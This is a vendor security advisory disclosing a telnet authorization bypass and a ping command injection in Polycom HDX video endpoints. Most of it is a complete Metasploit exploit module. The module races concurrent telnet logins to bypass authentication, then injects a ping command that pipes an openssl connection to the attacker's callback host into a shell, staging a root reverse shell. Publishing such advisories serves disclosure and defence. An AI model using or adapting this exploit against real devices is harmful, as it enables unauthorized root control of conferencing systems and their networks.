= Polycom HDX Telnet Authorization Bypass
=
= Vendor Website:
=    www.polycom.com
=
= Affected Version:
=   Polycom HDX devices:
=     All releases prior to and including Commercial 3.0.5
=
= Public disclosure on January 18, 2013
=
========================================================================

== Overview ==

The Polycom HDX is a series of telecommunication and video devices. The
telnet component of Polycom HDX video endpoint devices is vulnerable to
an authorization bypass when multiple simultaneous connections are
repeatedly made to the service, allowing remote network attackers to
gain full access to a Polycom command prompt without authentication. 
Versions prior to 3.0.4 also contain OS command injection in the ping
command which can be used to escape the telnet prompt and execute
arbitrary commands as root.
 
== Solution ==

Until a software solution is released, Polycom recommends administrators
disable telnet on their HDX unit.
 
== Credit ==

Discovered and advised to Polycom Inc., 2012 by Paul Haas of
Security-Assessment.com.

== About Security-Assessment.com ==

Security-Assessment.com is a leading team of Information Security
consultants specializing in providing high quality Information Security
services to clients throughout the Asia Pacific region. Our clients
include some of the largest globally recognized companies in areas such
as finance, telecommunications, broadcasting, legal and government. Our
aim is to provide the very best independent advice and a high level of
technical expertise while creating long and lasting professional
relationships with our clients.

Web: www.security-assessment.com 
Email: info@security-assessment.com

== Exploitation ==

The following Metasploit module can be used to reproduce the issue:

cat > psh_auth_bypass.rb <<EOF
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
    include Msf::Exploit::Remote::Tcp
    include Msf::Auxiliary::Report

    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;            => &#039;Polycom Command Shell Authorization
Bypass&#039;,
            &#039;Alias&#039;            => &#039;psh_auth_bypass&#039;,
            &#039;Author&#039;        => [ &#039;Paul Haas <Paul [dot] Haas [at]
Security-Assessment.com>&#039; ],
            &#039;DisclosureDate&#039;    => &#039;Jan 18 2013&#039;,
            &#039;Description&#039;    => %q{
                The login component of the Polycom Command Shell on
Polycom HDX
                Video End Points running software versions 3.0.5 and earlier
                is vulnerable to an authorization bypass when simultaneous
                connections are made to the service, allowing remote network
                attackers to gain access to a sandboxed telnet prompt
without
                authentication. Versions prior to 3.0.4 contain OS command
                injection in the ping command which can be used to execute
                arbitrary commands as root.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;    =>
                [
                    [ &#039;URL&#039;,
&#039;http://www.security-assessment.com/files/documents/advisory/Polycom%20HDX%20Telnet%20Authorization%20Bypass%20-%20RELEASE.pdf&#039;
],
                    [ &#039;URL&#039;,
&#039;http://blog.tempest.com.br/joao-paulo-campello/polycom-web-management-interface-os-command-injection.html&#039;
]
                ],
            &#039;Platform&#039;        => &#039;unix&#039;,
            &#039;Arch&#039;            => ARCH_CMD,
            &#039;Privileged&#039;    => true,
            &#039;Targets&#039;        => [ [ "Universal", {} ] ],
            &#039;Payload&#039;        =>
            {
                &#039;Space&#039;        => 8000,
                &#039;DisableNops&#039;    => true,
                &#039;Compat&#039;    => { &#039;PayloadType&#039;        => &#039;cmd&#039;,},
            },
            &#039;DefaultOptions&#039; => { &#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_openssl&#039; },
            &#039;DefaultTarget&#039; => 0
        ))

        register_options(
            [
                Opt::RHOST(),
                Opt::RPORT(23),
                OptAddress.new(&#039;CBHOST&#039;, [ false, "The listener address
used for staging the final payload" ]),
                OptPort.new(&#039;CBPORT&#039;, [ false, "The listener port used
for staging the final payload" ])
            ],self.class)
        register_advanced_options(
            [
                OptInt.new(&#039;THREADS&#039;, [false, &#039;Threads for
authentication bypass&#039;, 6]),
                OptInt.new(&#039;MAX_CONNECTIONS&#039;, [false, &#039;Threads for
authentication bypass&#039;, 100])
            ], self.class)
    end

    def check
        connect
        sock.put(Rex::Text.rand_text_alpha(rand(5)+1) + "\n")
        ::IO.select(nil, nil, nil, 1)
        res = sock.get
        disconnect

        if !(res and res.length > 0)
            return Exploit::CheckCode::Safe
        end

        if (res =~ /Welcome to ViewStation/)
            return Exploit::CheckCode::Appears
        end

        return Exploit::CheckCode::Safe
    end

    def exploit
        # Keep track of results (successful connections)
        results = []

        # Random string for password
        password = Rex::Text.rand_text_alpha(rand(5)+1)

        # Threaded login checker
        max_threads = datastore[&#039;THREADS&#039;]
        cur_threads = []

        # Try up to 100 times just to be sure
        queue = [*(1 .. datastore[&#039;MAX_CONNECTIONS&#039;])]

        print_status("Starting Authentication bypass with
#{datastore[&#039;THREADS&#039;]} threads with #{datastore[&#039;MAX_CONNECTIONS&#039;]} max
connections ")
        while(queue.length > 0)
            while(cur_threads.length < max_threads)

                # We can stop if we get a valid login
                break if results.length > 0

                # keep track of how many attempts we&#039;ve made
                item = queue.shift

                # We can stop if we reach max tries
                break if not item

                t = Thread.new(item) do |count|
                        sock = connect
                        sock.put(password + "\n")
                        res = sock.get

                        while res.length > 0
                            break if results.length > 0

                            # Post-login Polycom banner means success
                            if (res =~ /Polycom/)
                                results << sock
                                break
                            # bind error indicates bypass is working
                            elsif (res =~ /bind/)
                                sock.put(password + "\n")
                            #Login error means we need to disconnect
                            elsif (res =~ /failed/)
                                break
                            #To many connections means we need to disconnect
                            elsif (res =~ /Error/)
                                break
                            end
                            res = sock.get
                        end
                end

                cur_threads << t
            end

            # We can stop if we get a valid login
            break if results.length > 0

            # Add to a list of dead threads if we&#039;re finished
            cur_threads.each_index do |ti|
                t = cur_threads[ti]
                if not t.alive?
                    cur_threads[ti] = nil
                end
            end

            # Remove any dead threads from the set
            cur_threads.delete(nil)

            ::IO.select(nil, nil, nil, 0.25)
        end

        # Clean up any remaining threads
        cur_threads.each {|sock| sock.kill }

        if results.length > 0
            print_good("#{rhost}:#{rport} Successfully exploited the
authentication bypass flaw")
            do_payload(results[0])
        else
            print_error("#{rhost}:#{rport} Unable to bypass
authentication, this target may not be vulnerable")
        end

    end

    def do_payload(sock)
        # Prefer CBHOST, but use LHOST, or autodetect the IP otherwise
        cbhost = datastore[&#039;CBHOST&#039;] || datastore[&#039;LHOST&#039;] ||
Rex::Socket.source_address(datastore[&#039;RHOST&#039;])

        # Start a listener
        start_listener(true)

        # Figure out the port we picked
        cbport = self.service.getsockname[2]

        # Utilize ping OS injection to push cmd payload using stager
optimized for limited buffer < 128
        cmd = "\nping
;s=$IFS;openssl${s}s_client$s-quiet$s-host${s}#{cbhost}$s-port${s}#{cbport}|sh;ping$s-c${s}1${s}0\n"
        sock.put(cmd)

        # Give time for our command to be queued and executed
        1.upto(5) do
            ::IO.select(nil, nil, nil, 1)
            break if session_created?
        end
    end

    def stage_final_payload(cli)
        print_good("Sending payload of #{payload.encoded.length} bytes
to #{cli.peerhost}:#{cli.peerport}...")
        cli.put(payload.encoded + "\n")
    end

    def start_listener(ssl = false)
        comm = datastore[&#039;ListenerComm&#039;]
        if comm == "local"
            comm = ::Rex::Socket::Comm::Local
        else
            comm = nil
        end

        self.service = Rex::Socket::TcpServer.create(
            &#039;LocalPort&#039; => datastore[&#039;CBPORT&#039;],
            &#039;SSL&#039; => ssl,
            &#039;SSLCert&#039; => datastore[&#039;SSLCert&#039;],
            &#039;Comm&#039; => comm,
            &#039;Context&#039; =>
                {
                &#039;Msf&#039; => framework,
                &#039;MsfExploit&#039; => self,
                })

        self.service.on_client_connect_proc = Proc.new { |client|
        stage_final_payload(client)
        }

        # Start the listening service
        self.service.start
    end

    # Shut down any running services
    def cleanup
        super
        if self.service
            print_status("Shutting down payload stager listener...")
            begin
                self.service.deref if self.service.kind_of?(Rex::Service)
                if self.service.kind_of?(Rex::Socket)
                    self.service.close
                    self.service.stop
                end
                self.service = nil
            rescue ::Exception
            end
        end
    end

    # Accessor for our TCP payload stager
    attr_accessor :service

end

EOF

